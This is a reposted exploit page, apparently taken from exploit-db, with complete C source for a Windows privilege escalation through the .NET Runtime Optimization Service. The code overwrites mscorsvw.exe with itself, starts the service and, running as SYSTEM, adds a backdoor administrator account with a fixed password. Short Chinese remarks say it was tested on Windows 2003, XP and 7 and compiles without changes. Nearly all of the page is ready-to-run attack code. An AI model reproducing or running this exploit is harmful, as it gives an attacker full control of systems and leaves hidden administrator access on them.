.NET Runtime Optimization Service Privilege Escalation Exploit 0day

测试在Windows 2003，winxp的（SP3）中和Win7


---------------------------------------------------------------------

 


#include 
#include 

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 

#define PWN_EXE "c:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\mscorsvw.exe" 
#define PWN_SHORT "mscorsvw.exe" 
#define PWN_NAME ".NET Runtime Optimization Service v2.0.50727_X86" 
#define PWN_ID "clr_optimization_v2.0.50727_32" 

void ServiceMain(int argc, char** argv) { 
if (InitService()) { 
ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
ServiceStatus.dwWin32ExitCode = -1; 
SetServiceStatus(hStatus, &ServiceStatus); 
return; 
} 
ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
SetServiceStatus (hStatus, &ServiceStatus); 
} 

void ControlHandler(DWORD request); 
int InitService(); 

int main(int argc, char **argv) { 
char acUserName[100]; 
DWORD nUserName = sizeof(acUserName); 
GetUserName(acUserName, &nUserName); 

if (strcmp((char *)&acUserName, "SYSTEM")) { 
char *str = (char *)malloc(2048); 
memset(str, 0, 2048); 
snprintf(str, 2048, "%s.bak", PWN_EXE); 
if (rename(PWN_EXE, str) != 0) { 
fprintf(stderr, " :( sorry, can't write to file.\n"); 
exit(1); 
} 
CopyFile(argv[0], PWN_EXE, !0); 
snprintf(str, 2048, "net start \"%s\" 2> NUL > NUL",PWN_NAME); 
printf("\n >:D should have created a \n\n Username:\tServiceHelper\n Password:\tILov3Coff33!\n\n"); 
system(str); 
} 

SERVICE_TABLE_ENTRY ServiceTable[2]; 

ServiceTable[0].lpServiceName = PWN_ID; 
ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain; 

ServiceTable[1].lpServiceName = NULL; 
ServiceTable[1].lpServiceProc = NULL; 
StartServiceCtrlDispatcher(ServiceTable); 

return 0; 
} 

int InitService() { 
system("cmd /c net user ServiceHelper ILov3Coff33! /add & net localgroup Administrators ServiceHelper /add"); 
} 

----------------------------------------------------------------------------------------

By:fr1t0l4y

---------------------------------------------------------------------------------------
ps：这个可以一次编译成功，不用改啦……

 Form:http://www.exploit-db.com/exploits/16940/ exploit-db

比较厚道的，不在编译上难为小菜……
